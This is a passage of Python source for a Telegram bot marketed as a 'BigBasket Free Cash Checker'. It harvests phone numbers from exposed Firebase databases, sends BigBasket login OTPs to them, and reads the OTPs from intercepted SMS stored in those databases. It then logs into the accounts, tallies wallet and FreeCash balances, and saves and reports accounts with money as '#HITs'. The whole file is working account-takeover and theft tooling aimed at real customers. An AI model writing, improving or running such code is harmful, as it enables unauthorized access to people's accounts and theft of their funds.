                                    all_targets.append({"url": url, "cid": cid, "phone": phone})
                        except Exception:
                            pass
                except Exception:
                    pass

            scan_info.total_valid_phones = len(all_targets)

            if not all_targets or scan_info.cancelled:
                scan_info.is_running = False
                if not scan_info.cancelled:
                    await bot.send_message(
                        chat_id,
                        "ℹ️ <b>Background Scan Finished:</b> No active phone numbers were found on the connected Firebase database(s).",
                        reply_markup=get_main_reply_keyboard()
                    )
                return

            # Silent batch processing
            for i in range(0, len(all_targets), BATCH_SIZE):
                if scan_info.cancelled:
                    break

                batch_targets = all_targets[i:i+BATCH_SIZE]
                tracker = {}

                for target in batch_targets:
                    if scan_info.cancelled:
                        break
                    url = target["url"]
                    cid = target["cid"]
                    phone = target["phone"]
                    try:
                        known_keys = set()
                        async with session.get(f"{url}messages/{cid}.json?shallow=true", timeout=5) as r:
                            k_data = await r.json()
                            if isinstance(k_data, dict):
                                known_keys = set(k_data.keys())

                        tracker[cid] = {
                            "url": url,
                            "phone": phone,
                            "client": AsyncBigBasketClient(phone),
                            "done": False,
                            "is_banned": False,
                            "known_keys": known_keys
                        }
                    except Exception:
                        pass

                # Dispatch OTPs concurrently
                for cid, t in tracker.items():
                    if scan_info.cancelled:
                        break
                    success = False
                    for attempt in range(1, 6):
                        if scan_info.cancelled:
                            break
                        try:
                            status = await t["client"].send_otp()
                            if status == "SUCCESS":
                                success = True
                                break
                            elif status == "BANNED_OR_NOT_REGISTERED":
                                t["done"] = True
                                t["is_banned"] = True
                                break
                            else:
                                await t["client"].close()
                                t["client"] = AsyncBigBasketClient(t["phone"])
                                await asyncio.sleep(1.5)
                        except Exception:
                            await t["client"].close()
                            t["client"] = AsyncBigBasketClient(t["phone"])
                            await asyncio.sleep(1.5)
                    if not success and not t.get("is_banned"):
                        t["done"] = True
                    await asyncio.sleep(0.5)

                # Poll targets for OTP
                async def poll_target(cid, target):
                    if target["done"] or scan_info.cancelled:
                        scan_info.total_scanned += 1
                        return

                    for attempt in range(10, 0, -1):
                        if scan_info.cancelled:
                            break
                        await asyncio.sleep(3)
                        try:
                            async with session.get(f"{target['url']}messages/{cid}.json?orderBy=\"$key\"&limitToLast=15", timeout=5) as r:
                                msgs = await r.json()
                                if isinstance(msgs, dict):
                                    for msg_key, msg_val in msgs.items():
                                        if msg_key not in target["known_keys"] and isinstance(msg_val, dict):
                                            txt = str(msg_val.get("body") or msg_val.get("message") or "")
                                            otp = extract_bb_otp(txt)
                                            if otp:
                                                v_res = await target["client"].verify_otp(otp)
                                                if v_res == "SUCCESS":
                                                    w_bal = await target["client"].get_wallet_balance()
                                                    fc_bal = await target["client"].get_freecash_balance()
                                                    w_num = parse_numeric(w_bal)
                                                    fc_num = parse_numeric(fc_bal)
                                                    tot_bal = round(w_num + fc_num, 2)

                                                    acc_data = target["client"].get_account_data(
                                                        wallet=w_bal,
                                                        freecash=fc_bal,
                                                        source="Firebase Background Scan"
                                                    )

                                                    if tot_bal >= 1:
                                                        save_success_account(acc_data)
                                                        scan_info.total_hits += 1
                                                        if fc_num >= 125:
                                                            scan_info.total_125_hits += 1
                                                        scan_info.total_wallet += w_num
                                                        scan_info.total_freecash += fc_num

                                                    resp_time = time.time() - target.get("start_time", time.time())
                                                    hit_card = format_hit_card(target["phone"], w_bal, fc_bal, target["url"], resp_time=resp_time)
                                                    hit_kb = get_card_hit_keyboard(target["phone"])
                                                    try:
                                                        await bot.send_message(chat_id, hit_card, reply_markup=hit_kb)
                                                    except Exception as err:
                                                        print(f"Error sending #HIT notification: {err}")

                                                    if tot_bal > 50:
                                                        await send_mono_account_json(chat_id, target["phone"], acc_data)
                                                        await send_single_account_json(chat_id, target["phone"], acc_data)

                                                target["done"] = True
                                                scan_info.total_scanned += 1
                                                return
                        except Exception:
                            pass

                    target["done"] = True
                    scan_info.total_scanned += 1

                poll_tasks = [asyncio.create_task(poll_target(cid, t)) for cid, t in tracker.items()]
                await asyncio.gather(*poll_tasks)

                for t in tracker.values():
                    await t["client"].close()

                del tracker
                del poll_tasks
                gc.collect()

    except Exception as e:
        print(f"[-] Error in background scan: {e}")
    finally:
        scan_info.is_running = False
        status_title = "🛑 <b>BACKGROUND SCAN CANCELLED</b>" if scan_info.cancelled else "✅ <b>BACKGROUND SCAN COMPLETED!</b>"
        summary_msg = (
            f"{status_title}\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 <b>Total Scanned:</b> <code>{scan_info.total_scanned}/{scan_info.total_valid_phones}</code>\n"
            f"🎯 <b>Total #HITs (₹1+):</b> <code>{scan_info.total_hits}</code>\n"
            f"🔥 <b>125 FreeCash Hits:</b> <code>{scan_info.total_125_hits}</code>\n"
            f"💰 <b>Wallet Discovered:</b> <code>₹{scan_info.total_wallet}</code>\n"
            f"🎁 <b>FreeCash Discovered:</b> <code>₹{scan_info.total_freecash}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💾 <i>All #HIT accounts saved automatically to database!</i>"
        )
        try:
            await bot.send_message(chat_id, summary_msg, reply_markup=get_main_reply_keyboard())
        except Exception:
            pass

@dp.message(Command("scan_status"))
@dp.message(F.text.contains("Scan Status"))
@dp.callback_query(F.data == "btn_scan_status")
async def handle_scan_status(event: types.Message | CallbackQuery):
    chat_id = event.chat.id if isinstance(event, types.Message) else event.message.chat.id
    if isinstance(event, CallbackQuery):
        await event.answer()

    scan = active_scans.get(chat_id)
    if not scan or not scan.is_running:
        msg = "ℹ️ <b>No active background scan currently running.</b>"
        if isinstance(event, CallbackQuery):
            await event.message.answer(msg, reply_markup=get_main_reply_keyboard())
        else:
            await event.answer(msg, reply_markup=get_main_reply_keyboard())
        return

    elapsed = ""
    if scan.start_time:
        secs = int((datetime.now() - scan.start_time).total_seconds())
        mins, s = divmod(secs, 60)
        elapsed = f"{mins}m {s}s"

    text = (
        "📊 <b>BACKGROUND SCAN STATUS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚙️ <b>Status:</b> 🟢 Running in Background\n"
        f"⏱️ <b>Elapsed Time:</b> <code>{elapsed}</code>\n"
        f"📱 <b>Progress:</b> <code>{scan.total_scanned} / {scan.total_valid_phones}</code> numbers\n"
        f"🎯 <b>Total #HITs (₹1+):</b> <code>{scan.total_hits}</code>\n"
        f"🔥 <b>125 FreeCash Hits:</b> <code>{scan.total_125_hits}</code>\n"
        f"💰 <b>Wallet Found:</b> <code>₹{scan.total_wallet}</code>\n"
        f"🎁 <b>FreeCash Found:</b> <code>₹{scan.total_freecash}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💡 <i>You can use the bot normally while scanning runs in the background.</i>"
    )
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🔄 Refresh Status", callback_data="btn_scan_status"),
                InlineKeyboardButton(text="🛑 Stop Scan", callback_data="btn_stop_scan")
            ]
        ]
    )
    if isinstance(event, CallbackQuery):
        await event.message.answer(text, reply_markup=kb)
    else:
        await event.answer(text, reply_markup=kb)

@dp.message(Command("stop_scan"))
@dp.callback_query(F.data == "btn_stop_scan")
async def handle_stop_scan(event: types.Message | CallbackQuery):
    chat_id = event.chat.id if isinstance(event, types.Message) else event.message.chat.id
    if isinstance(event, CallbackQuery):
        await event.answer("Stopping scan...")

    scan = active_scans.get(chat_id)
    if scan and scan.is_running:
        scan.cancelled = True
        msg = "🛑 <b>Stopping background scan...</b> Final summary will be sent shortly."
    else:
        msg = "ℹ️ <b>No active background scan running.</b>"

    if isinstance(event, CallbackQuery):
        await event.message.answer(msg)
    else:
        await event.answer(msg)

# ==============================================================================
# 🏁 MAIN LAUNCHER WITH BOT COMMAND MENU
# ==============================================================================
async def setup_bot_commands():
    commands = [
        BotCommand(command="start", description="🚀 Open Main Menu & Dashboard"),
        BotCommand(command="firebase", description="🔵 Run Silent Background Firebase Scanner"),
        BotCommand(command="scan_status", description="📊 View Active Background Scan Status"),
        BotCommand(command="stop_scan", description="🛑 Stop Current Background Scan"),
        BotCommand(command="hits", description="🎯 View 125 FreeCash Jackpot Hits"),
        BotCommand(command="accounts", description="📋 View Saved Accounts (₹1+)"),
        BotCommand(command="download", description="📁 Download Accounts JSON (All / Cash / 1/1)"),
        BotCommand(command="single", description="📥 Download 1/1 Account JSON (/single <phone>)"),
        BotCommand(command="recheck", description="⚡ Live Re-Check All Saved Accounts"),
        BotCommand(command="login", description="📱 Manual Login with Phone Number"),
        BotCommand(command="stats", description="📊 View Database Vault Stats"),
        BotCommand(command="clear", description="🗑️ Clear Saved JSON Data"),
        BotCommand(command="cancel", description="❌ Cancel Current Operation")
    ]
    try:
        await bot.set_my_commands(commands)
    except Exception as e:
        print(f"[-] Could not set bot commands: {e}", flush=True)

    try:
        short_desc = "🦅 ASTECH EARNING | 🔥 BigBasket Free Cash Checker | 🎯 #HIT Notification Bot"
        await bot.set_my_short_description(short_description=short_desc)
    except Exception as e:
        print(f"[-] Could not set bot bio: {e}", flush=True)

    try:
        await bot.set_my_name(name="🦅 𝘽𝘽 𝙁𝙍𝙀𝙀 𝘾𝘼𝙎𝙃~𝘼𝙎𝙏𝙀𝘾𝙃")
    except Exception as e:
        pass

async def main():
    try:
        print("[+] Setting up Telegram Bot Command Menu...", flush=True)
        await setup_bot_commands()
        print("[+] Flushing pending updates...", flush=True)
        await bot.delete_webhook(drop_pending_updates=True)
        print("[+] Bot is now online and listening for updates!", flush=True)
        await dp.start_polling(bot)
    except Exception as e:
        print(f"[-] Telegram Error ({type(e).__name__}): {e}")
        print("💡 Please ensure a valid TELEGRAM_BOT_TOKEN is set in your .env file.")

if __name__ == "__main__":
    asyncio.run(main())
